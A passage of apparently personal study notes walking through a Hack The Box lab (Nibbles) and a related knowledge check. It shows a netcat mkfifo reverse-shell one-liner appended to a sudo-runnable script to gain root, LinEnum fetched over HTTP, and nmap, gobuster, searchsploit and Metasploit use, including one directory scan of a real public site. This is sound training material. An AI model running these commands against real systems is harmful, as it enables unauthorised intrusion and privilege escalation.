+curl <a class="reference external" href="http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php">http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php</a></p>
+<section id="enum-using-script">
+<h5><span class="section-number">1.7.1.4.2.1. </span>enum using script<a class="headerlink" href="#enum-using-script" title="Link to this heading">#</a></h5>
+<p>wget <a class="reference external" href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</a></p>
+<p>sudo python3 -m http.server 8080</p>
+<p>wget <a class="reference external" href="http://10.10.14.36:8080/LinEnum.sh">http://10.10.14.36:8080/LinEnum.sh</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">11</span>/May/2024<span class="w"> </span><span class="m">17</span>:29:45<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /LinEnum.sh HTTP/1.1&quot;</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-
+
+nibbler@Nibbles:/home/nibbler$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>nibbler<span class="w"> </span>nibbler<span class="w"> </span><span class="m">46631</span><span class="w"> </span>May<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">12</span>:26<span class="w"> </span>LinEnum.sh
+
+nibbler@Nibbles:/home/nibbler$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>LinEnum.sh
+
+nibbler@Nibbles:/home/nibbler$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/home/nibbler/personal/stuff/monitor.sh
+ls<span class="w"> </span>-l<span class="w"> </span>/home/nibbler/personal/stuff/monitor.sh
+-rwxrwxrwx<span class="w"> </span><span class="m">1</span><span class="w"> </span>nibbler<span class="w"> </span>nibbler<span class="w"> </span><span class="m">4015</span><span class="w"> </span>May<span class="w">  </span><span class="m">8</span><span class="w">  </span><span class="m">2015</span><span class="w"> </span>/home/nibbler/personal/stuff/monitor.sh
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nibbler@Nibbles:/home/nibbler/personal/stuff$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.36 8443 &gt;/tmp/f&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w">  </span>/home/nibbler/personal/stuff/monitor.sh
+
+<span class="w"> </span>nibbler@Nibbles:/home/nibbler/personal/stuff$<span class="w"> </span>sudo<span class="w"> </span>/home/nibbler/personal/stuff/monitor.sh<span class="w"> </span><span class="se">\</span>
+
+sudo<span class="w"> </span>/home/nibbler/personal/stuff/monitor.sh
+
+┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-nnyvvnfeph<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8443</span>
+Ncat:<span class="w"> </span>Version<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org/ncat<span class="w"> </span><span class="o">)</span>
+Ncat:<span class="w"> </span>Listening<span class="w"> </span>on<span class="w"> </span>:::8443
+Ncat:<span class="w"> </span>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0:8443
+Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.129.200.170.
+Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.129.200.170:35790.
+<span class="c1"># </span>
+
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+
+root@Nibbles:/home#<span class="w"> </span>ls<span class="w"> </span>-la
+ls<span class="w"> </span>-la
+total<span class="w"> </span><span class="m">12</span>
+drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>root<span class="w">    </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="m">2017</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">23</span><span class="w"> </span>root<span class="w">    </span>root<span class="w">    </span><span class="m">4096</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">09</span>:51<span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">4</span><span class="w"> </span>nibbler<span class="w"> </span>nibbler<span class="w"> </span><span class="m">4096</span><span class="w"> </span>May<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">12</span>:48<span class="w"> </span>nibbler
+
+root@Nibbles:~#<span class="w"> </span>cat<span class="w"> </span>root.txt
+cat<span class="w"> </span>root.txt
+de5e5d6619862a8aa5b9b212314e0cdd
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+<section id="knowledge-check">
+<h3><span class="section-number">1.7.1.5. </span>Knowledge check<a class="headerlink" href="#knowledge-check" title="Link to this heading">#</a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1">#get info on open ports</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>--open<span class="w"> </span>-oA<span class="w"> </span>nibbles_initial_scan<span class="w"> </span><span class="m">10</span>.129.42.249
+
+whatweb<span class="w"> </span><span class="m">10</span>.129.42.249
+
+<span class="c1">#get webpage content</span>
+curl<span class="w"> </span>http://10.129.42.249
+
+firefox<span class="w"> </span>http://10.129.42.249
+
+whatweb<span class="w"> </span>http://get-simple.info/wiki/
+
+<span class="c1">#find dir entries</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.129.42.249<span class="w"> </span>--wordlist<span class="w"> </span>/usr/share/dirb/wordlists/common.txt
+
+http://10.129.42.249/robots.txt
+
+http://10.129.42.249//sitemap.xml<span class="w"> </span>
+
+http://10.129.42.249//index.php<span class="w"> </span>
+
+google
+
+searchsploit
+
+metasploit<span class="o">[</span><span class="m">1</span><span class="o">]</span>
+</pre></div>
+</div>
+<p>command result</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-iy9w8jfwaz<span class="o">]</span>─<span class="o">[</span>~/Desktop<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>--open<span class="w"> </span>-oA<span class="w"> </span>nibbles_initial_scan<span class="w"> </span><span class="m">10</span>.129.42.249
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2024</span>-05-12<span class="w"> </span><span class="m">01</span>:11<span class="w"> </span>BST
+
+PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.1<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.41<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+
+┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-iy9w8jfwaz<span class="o">]</span>─<span class="o">[</span>~/Desktop<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>whatweb<span class="w"> </span><span class="m">10</span>.129.42.249
+http://10.129.42.249<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>AddThis,<span class="w"> </span>Apache<span class="o">[</span><span class="m">2</span>.4.41<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>Ubuntu<span class="w"> </span>Linux<span class="o">][</span>Apache/2.4.41<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.129.42.249<span class="o">]</span>,<span class="w"> </span>Script<span class="o">[</span>text/javascript<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>Welcome<span class="w"> </span>to<span class="w"> </span>GetSimple!<span class="w"> </span>-<span class="w"> </span>gettingstarted<span class="o">]</span>
+
+┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-iy9w8jfwaz<span class="o">]</span>─<span class="o">[</span>~/Desktop<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>whatweb<span class="w"> </span>http://get-simple.info/wiki/
+http://get-simple.info/wiki/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Cookies<span class="o">[</span>DWcb100c0f811c1b6d691e3e7c406b56ba,DokuWiki,mybb<span class="o">[</span>lastactive<span class="o">]</span>,mybb<span class="o">[</span>lastvisit<span class="o">]</span>,sid<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>UNITED<span class="w"> </span>STATES<span class="o">][</span>US<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>nginx<span class="o">]</span>,<span class="w"> </span>HttpOnly<span class="o">[</span>DWcb100c0f811c1b6d691e3e7c406b56ba,DokuWiki,sid<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">72</span>.10.36.125<span class="o">]</span>,<span class="w"> </span>JQuery,<span class="w"> </span>MetaGenerator<span class="o">[</span>DokuWiki<span class="o">]</span>,<span class="w"> </span>OpenSearch<span class="o">[</span>/wiki/lib/exe/opensearch.php<span class="o">]</span>,<span class="w"> </span>PHP<span class="o">[</span><span class="m">5</span>.3.29,<span class="o">]</span>,<span class="w"> </span>Plesk<span class="o">[</span>Lin<span class="o">]</span>,<span class="w"> </span>PoweredBy<span class="o">[</span>PHP<span class="o">]</span>,<span class="w"> </span>Script<span class="o">[</span>text/javascript<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>start<span class="w"> </span><span class="o">[</span>GetSimple<span class="w"> </span>CMS<span class="w"> </span>Wiki<span class="o">]]</span>,<span class="w"> </span>X-Powered-By<span class="o">[</span>PHP/5.3.29,<span class="w"> </span>PleskLin<span class="o">]</span>,<span class="w"> </span>X-UA-Compatible<span class="o">[</span><span class="nv">IE</span><span class="o">=</span>edge,chrome<span class="o">=</span><span class="m">1</span><span class="o">]</span>,<span class="w"> </span>nginx
+
+/.hta<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">278</span><span class="o">]</span>
+/.htaccess<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">278</span><span class="o">]</span>
+/.htpasswd<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">278</span><span class="o">]</span>
+/admin<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">314</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.42.249/admin/<span class="o">]</span>
+/backups<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">316</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.42.249/backups/<span class="o">]</span>
+/data<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">313</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.42.249/data/<span class="o">]</span><span class="w">   </span>
+/index.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">5485</span><span class="o">]</span><span class="w">                                   </span>
+/plugins<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">316</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.42.249/plugins/<span class="o">]</span>
+/robots.txt<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">32</span><span class="o">]</span><span class="w">                                     </span>
+/server-status<span class="w">        </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">278</span><span class="o">]</span><span class="w">                                    </span>
+/sitemap.xml<span class="w">          </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">431</span><span class="o">]</span><span class="w">                                    </span>
+/theme<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">314</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.42.249/theme/<span class="o">]</span><span class="w"> </span>
+
+robots.txt
+User-agent:<span class="w"> </span>*
+Disallow:<span class="w"> </span>/admin/
+
+sitemap.xml
+&lt;loc&gt;http://gettingstarted.htb/&lt;/loc&gt;
+&lt;lastmod&gt;2021-02-09T09:53:11+00:00&lt;/lastmod&gt;
+&lt;changefreq&gt;weekly&lt;/changefreq&gt;
+&lt;priority&gt;1.0&lt;/priority&gt;
+
+┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-iy9w8jfwaz<span class="o">]</span>─<span class="o">[</span>~/Desktop<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>searchsploit<span class="w"> </span>apache<span class="w"> </span><span class="m">2</span>.4.41
+-----------------------------------------------------<span class="w"> </span>---------------------------------
+<span class="w"> </span>Exploit<span class="w"> </span>Title<span class="w">                                       </span><span class="p">|</span><span class="w">  </span>Path
+-----------------------------------------------------<span class="w"> </span>---------------------------------
+Apache<span class="w"> </span>+<span class="w"> </span>PHP<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.3.12<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.4.2<span class="w"> </span>-<span class="w"> </span>cgi-bin<span class="w"> </span>Remote<span class="w"> </span>Cod<span class="w"> </span><span class="p">|</span><span class="w"> </span>php/remote/29290.c
+Apache<span class="w"> </span>+<span class="w"> </span>PHP<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.3.12<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.4.2<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Code<span class="w"> </span>Execut<span class="w"> </span><span class="p">|</span><span class="w"> </span>php/remote/29316.py
+Apache<span class="w"> </span>CXF<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.5.10/2.6.7/2.7.4<span class="w"> </span>-<span class="w"> </span>Denial<span class="w"> </span>of<span class="w"> </span>Service<span class="w">  </span><span class="p">|</span><span class="w"> </span>multiple/dos/26710.txt
+Apache<span class="w"> </span>mod_ssl<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.8.7<span class="w"> </span>OpenSSL<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;OpenFuck.c&#39;</span><span class="w"> </span>Remote<span class="w"> </span><span class="p">|</span><span class="w"> </span>unix/remote/21671.c
+Apache<span class="w"> </span>mod_ssl<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.8.7<span class="w"> </span>OpenSSL<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;OpenFuckV2.c&#39;</span><span class="w"> </span>Remo<span class="w"> </span><span class="p">|</span><span class="w"> </span>unix/remote/47080.c
+Apache<span class="w"> </span>mod_ssl<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.8.7<span class="w"> </span>OpenSSL<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;OpenFuckV2.c&#39;</span><span class="w"> </span>Remo<span class="w"> </span><span class="p">|</span><span class="w"> </span>unix/remote/764.c
+Apache<span class="w"> </span>OpenMeetings<span class="w"> </span><span class="m">1</span>.9.x<span class="w"> </span>&lt;<span class="w"> </span><span class="m">3</span>.1.0<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;.ZIP&#39;</span><span class="w"> </span>File<span class="w"> </span>Dire<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/webapps/39642.txt
+Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.5.17<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Directory<span class="w"> </span>Listing<span class="w">    </span><span class="p">|</span><span class="w"> </span>multiple/remote/2061.txt
+Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">6</span>.0.18<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;utf8&#39;</span><span class="w"> </span>Directory<span class="w"> </span>Traversal<span class="w">  </span><span class="p">|</span><span class="w"> </span>multiple/remote/6229.txt
+Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">6</span>.0.18<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;utf8&#39;</span><span class="w"> </span>Directory<span class="w"> </span>Traversal<span class="w">  </span><span class="p">|</span><span class="w"> </span>unix/remote/14489.c
+Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">9</span>.0.1<span class="w"> </span><span class="o">(</span>Beta<span class="o">)</span><span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.5.23<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.0.47<span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>jsp/webapps/42966.py
+Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">9</span>.0.1<span class="w"> </span><span class="o">(</span>Beta<span class="o">)</span><span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.5.23<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.0.47<span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>windows/webapps/42953.txt
+Apache<span class="w"> </span>Xerces-C<span class="w"> </span>XML<span class="w"> </span>Parser<span class="w"> </span>&lt;<span class="w"> </span><span class="m">3</span>.1.2<span class="w"> </span>-<span class="w"> </span>Denial<span class="w"> </span>of<span class="w"> </span>Servi<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/dos/36906.txt
+Webfroot<span class="w"> </span>Shoutbox<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.32<span class="w"> </span><span class="o">(</span>Apache<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>Local<span class="w"> </span>File<span class="w"> </span>Inclu<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/remote/34.pl
+-----------------------------------------------------<span class="w"> </span>---------------------------------
+</pre></div>
+</div>
+<p>[1]msfconsole</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfconsole
+
+search<span class="w"> </span>GetSimple
+
+search<span class="w"> </span>GetSimple<span class="w"> </span>CMS
+
+use<span class="w"> </span><span class="m">0</span>
+
+show<span class="w"> </span>options
+
+setg<span class="w"> </span>username<span class="w"> </span>admin
+
+setg<span class="w"> </span>password<span class="w"> </span><span class="m">123456</span>
+</pre></div>
+</div>
+<p>When you cant seem to get to the right information, it is likely your not looking at the right content</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-eqighy8yx8<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://get-simple.info<span class="w"> </span>--wordlist<span class="w"> </span>/usr/share/dirb/wordlists/common.txt
+
+/download<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">10631</span><span class="o">]</span><span class="w">                                           </span>
+/Download<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">10631</span><span class="o">]</span><span class="w"> </span>
+/debug<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">8265</span><span class="o">]</span><span class="w">                                            </span>
+Progress:<span class="w"> </span><span class="m">1214</span><span class="w"> </span>/<span class="w"> </span><span class="m">4615</span><span class="w"> </span><span class="o">(</span><span class="m">26</span>.31%<span class="o">)</span><span class="w">                                            </span>/demo<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">8703</span><span class="o">]</span><span class="w">   </span>
+/changelog<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">36174</span><span class="o">]</span><span class="w">   </span>
+/blog<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">8335</span><span class="o">]</span><span class="w">                                            </span>
+/Blog<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">8335</span><span class="o">]</span><span class="w">     </span>
+/privacy<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">13858</span><span class="o">]</span><span class="w">                                             </span>
+/Privacy<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">13858</span><span class="o">]</span><span class="w">   </span>
+/sitemap.xml<span class="w">          </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">4107</span><span class="o">]</span><span class="w">   </span>
+/screenshots<span class="w">          </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">10166</span><span class="o">]</span><span class="w">  </span>
+
+curl<span class="w"> </span>-s<span class="w"> </span>http://10.129.35.99/nibbleblog/content/private/config.xml<span class="w"> </span><span class="p">|</span><span class="w"> </span>xmllint<span class="w"> </span>--format<span class="w"> </span>-
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            name: "python3",
+            path: "./docs\cybersecurity"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+                </article>
+              
+
+              
+              
+              
+              
+                <footer class="prev-next-footer">
+                  
+<div class="prev-next-area">
+    <a class="left-prev"
+       href="cysa.html"
+       title="previous page">
+      <i class="fa-solid fa-angle-left"></i>
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">previous</p>
+        <p class="prev-next-title"><span class="section-number">1.6. </span>CompTIA CySA+ (CS0-003)</p>
+      </div>
+    </a>
+    <a class="right-next"
+       href="../c/c_intro.html"
+       title="next page">
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title"><span class="section-number">2. </span>Welcome to C Programming Language</p>
+      </div>
+      <i class="fa-solid fa-angle-right"></i>
+    </a>
+</div>
+                </footer>
+              
+            </div>
+            
+            
+              
+                <div class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item">
+  <div class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav class="bd-toc-nav page-toc">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#getting-started">1.7.1. Getting Started</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#web-enumeration">1.7.1.1. Web Enumeration</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#priv-esc">1.7.1.2. Priv Esc</a><ul class="nav section-nav flex-column">
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#run-vuln-checklist-scripts">1.7.1.2.1. Run vuln checklist scripts</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#ssh">1.7.1.2.2. ssh</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#vuln-software">1.7.1.2.3. vuln software</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#linux">1.7.1.2.3.1. linux</a></li>
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#win">1.7.1.2.3.2. win</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#check-priv-avail">1.7.1.2.4. check priv avail</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#sudo">1.7.1.2.4.1. sudo</a></li>
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#nopasswd-entry">1.7.1.2.4.2. NOPASSWD entry</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#cron-jobs">1.7.1.2.5. Cron Jobs</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#exposed-credentials">1.7.1.2.6. exposed credentials</a></li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#ssh-keys">1.7.1.2.7. ssh keys</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#use-their-key">1.7.1.2.7.1. use their key</a></li>
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#add-our-key">1.7.1.2.7.2. add our key</a></li>
+</ul>
+</li>
+<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#priv-esc-box">1.7.1.2.8. priv esc box</a><ul class="nav section-nav flex-column">
+<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#horizontal-movement">1.7.1.2.8.1. horizontal movement</a></li>
